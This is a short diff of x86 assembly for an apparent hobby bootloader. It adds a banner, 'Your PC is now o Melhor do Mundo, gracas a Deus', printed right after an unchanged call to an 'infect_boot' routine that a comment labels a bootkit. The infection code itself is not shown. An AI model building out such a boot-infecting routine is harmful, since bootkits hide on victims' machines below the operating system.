@@ -55,6 +55,9 @@ load_kernel:
         ; Infecting boot (bootkit routine)
         call infect_boot
 
+        mov si, boot_infected
+        call print_string
+
         ; Finishing kernel loading (Real Mode)
         mov si, kload_success
         call print_string
@@ -103,6 +106,7 @@ a20_msg        db  "Enabled Fast A20 Gate.", 13, 10, 0
 kload_init     db  "Starting kernel loading from disk...", 13, 10, 0
 kload_att_err  db  "Kernel loading error. Trying again...", 13, 10, 0
 kload_err      db  "Error while trying to load the kernel. Aborted.", 13, 10, 0
-kload_success  db  10, "Kernel loaded successfully!", 13, 10, "Transfering control...", 13, 10, 10, 10, 0
+boot_infected  db  10, 10, 10, "Your PC is now o Melhor do Mundo, gracas a Deus.", 13, 10, 10, 10, 0
+kload_success  db  10, "Kernel loaded successfully!", 13, 10, 10, "Transfering control...", 13, 10, 10, 10, 0
 
 times 4096 - ($ - $$) db 0
